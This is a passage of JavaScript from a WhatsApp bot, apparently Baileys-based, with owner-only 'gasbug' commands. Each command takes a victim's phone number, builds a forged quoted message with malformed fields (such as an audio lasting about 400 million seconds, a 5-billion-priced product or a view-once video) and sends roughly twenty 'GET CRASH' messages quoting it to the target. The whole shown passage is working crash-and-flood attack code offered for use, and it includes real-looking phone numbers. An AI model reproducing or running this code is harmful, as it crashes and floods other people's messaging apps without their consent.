haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foto1})
await m.reply(`Succes`)
break
case 'gasbug3':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fvoc1 = {
key: { 
fromMe: false,
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"audioMessage": {
"mimetype":"audio/ogg; codecs=opus",
"seconds": "400000271",
"ptt": "true"
}
} 
}
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fvoc1})
await m.reply(`Succes`)
break
case 'gasbug4':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fgif1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { "videoMessage": { 
"title":"hallo bang","h": 
`Hmm`,'seconds': '359996400', 
'gifPlayback': 'true', 
'caption': `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
'jpegThumbnail': fs.readFileSync(`./pict.jpg`),
}
}
}
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgif1})
await m.reply(`Succes`)
break 
case 'gasbug5':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let floc1 = {
key : {
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
liveLocationMessage: {
caption: `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
jpegThumbnail: fs.readFileSync(`./pict.jpg`), 
}
}
}
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:floc1})
await m.reply(`Succes`)
break
case 'gasbug6':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let ftoko1 = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
"productMessage": { 
"product": { 
"productImage":{ 
"mimetype": "image/jpeg", 
"jpegThumbnail": fs.readFileSync(`./pict.jpg`)}, 
"title": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲", 
"description": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲", 
"currencyCode": "USD", 
"priceAmount1000": "5000000000", 
"retailerId": "© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲", 
"productImageCount": 1}, 
"businessOwnerJid": `6285737134572@s.whatsapp.net`}}}
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:ftoko1})
await m.reply(`Succes`)
break
case 'gasbug7':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let foncevid1 = { 
key: {
fromMe: false, 
remoteJid: "6281315995629@g.us", 
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: { 
videoMessage: { 
viewOnce: true
},
},
};
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:foncevid1})
await m.reply(`Succes`)
break
case 'gasbug8':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fonceimg1 = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
message: {
imageMessage: {
viewOnce: true
},
},
};
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fonceimg1})
await m.reply(`Succes`)
break
case 'gasbug9':
if (!mek.key.fromMe) return reply('Fitur Khusus Owner!')
if (!text) throw `Nomernya?`
let fgc1 = { 
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) 
},
"message": {
"groupInviteMessage": {
"groupJid": "62895619083555-1616169743@g.us",
"inviteCode": "mememteeeekkeke",
"groupName": "P",
"caption": `© 𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲`,
 'jpegThumbnail': fs.readFileSync('./pict.jpg')}}}
 haikal.sendMessage(m.chat, {text:"𝓑𝔂 : 𝓐. 𝓡𝓪𝓱𝓶𝓪𝓭𝓪𝓷𝓲 GET CRASH"},{quoted:fgc1})
